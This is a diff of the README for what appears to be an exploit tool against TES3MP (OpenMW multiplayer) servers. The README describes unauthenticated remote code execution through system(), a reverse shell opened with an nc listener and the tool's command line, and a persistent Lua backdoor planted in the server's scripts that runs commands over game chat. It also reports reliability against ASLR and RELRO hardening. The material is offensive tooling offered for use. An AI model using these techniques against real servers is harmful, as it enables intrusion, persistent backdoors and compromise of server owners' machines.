@@ -20,7 +20,7 @@ the server runs under.
 | A prior login of any kind | **no** |
 | Any file from the target box | **no**: libc base is resolved over the wire; `system`'s per-build offset comes from a table of public distro packages (`--system-off`/`--libc` for a glibc not in it) |
 
-The distinction matters and is easy to get wrong. TES3MP has **two independent secrets**:
+The distinction is easy to get wrong. TES3MP has **two independent secrets**:
 
 1. **The server password**, one shared string, set by the admin in the server config, checked in C++ at
    `ID_SYSTEM_HANDSHAKE` (`apps/openmw-mp/Networking.cpp:118`). A wrong value gets the client kicked before
@@ -182,7 +182,7 @@ If the probe reaches `POSTLOADED`, the full run (drop `-p`, set `-c`) will fire.
 ### Reachability notes
 
 * **`ping` lies.** Many servers drop ICMP while the game's UDP port is open (it has to be, for players).
-  A failed `ping` says nothing; the probe is the real reachability test.
+  A failed `ping` says nothing; the probe is the reachability test.
 * **Split-horizon DNS.** A hostname may resolve to an internal address on the LAN and a public one from
   outside. If the internal address is firewalled off but the public one hairpins, or vice versa, try both.
   Point the exploit at whichever address the probe actually reaches.
@@ -205,7 +205,7 @@ nc -lvnp 4444
   victim.example.net
 ```
 
-Three details, each of which is load-bearing:
+Three details, each of them required:
 
 * **The trailing `&` is mandatory.** `system()` blocks until the command finishes. Without it the server's
   packet loop stalls for as long as the shell is open, and the shell's eventual exit status is then used as
@@ -222,10 +222,10 @@ A reverse shell needs the target to open a **new outbound** connection, which an
 drops. When that is the case, ride the **inbound game flow** instead: the one channel that is open by
 definition, because players connect on it.
 
-The way to do that is not a socket-level trick, it is the server's own script loader. `system()` writes a
+The way to do that is not a socket-level trick but the server's own script loader. `system()` writes a
 Lua module into the server's `scripts/custom/` and appends one `require` line to `customScripts.lua`.
 The exploit crashes the server seconds later (see the crash note above), `systemd` restarts it, and the
-restarted process loads the module as part of its normal startup. From then on the backdoor lives inside a
+restarted process loads the module as part of its normal startup. From then on the backdoor runs inside a
 healthy server that owns the game socket, and it answers over RakNet using the server's own message API:
 a chat command in, command output back as server messages.
 
@@ -243,7 +243,7 @@ a chat command in, command output back as server messages.
 ./tes3mp-rce --shell -P '<server password>' -n rce -c 'id' <host>
 ```
 
-Two properties are worth being explicit about, because they are the difference between this and the
+Two properties need stating explicitly, because they are the difference between this and the
 exploit chain:
 
 * **`--shell` needs a user account, and the exploit chain does not.** CoreScripts gates chat on
@@ -340,8 +340,10 @@ readelf -rW /usr/lib/x86_64-linux-gnu/libluajit-5.1.so.2 | grep ' strlen@'    # 
 ## Status
 
 Demonstrated with a non-destructive marker payload, **5/5 cold starts** against a fresh server with fresh
-ASLR each run (`evidence/rce-and-reverse-shell.txt`). The `--via-luajit` route is a separate **6/6**,
-including one run on a profile derived entirely from the TES3MP headers. Five is the whole sample: it is enough to show the
-chain is not a fluke, not enough to put a number on the failure rate. Reliability was measured on an idle
+ASLR each run (`evidence/rce-and-reverse-shell.txt`). The `--via-luajit` route is measured
+separately: **6/6** against the stock partial-RELRO release binary, including one run on a profile
+derived entirely from the TES3MP headers, and **4/4** against a server actually built with
+`-z now`, where the executable's own GOT is read-only. Those are three small samples, enough to show
+none of the three is a fluke and not enough to put a number on any failure rate. Reliability was measured on an idle
 lab server; a busy server with competing packet traffic is untested and would be expected to degrade,
 since the grooming steps assume nothing else is churning the heap in between.
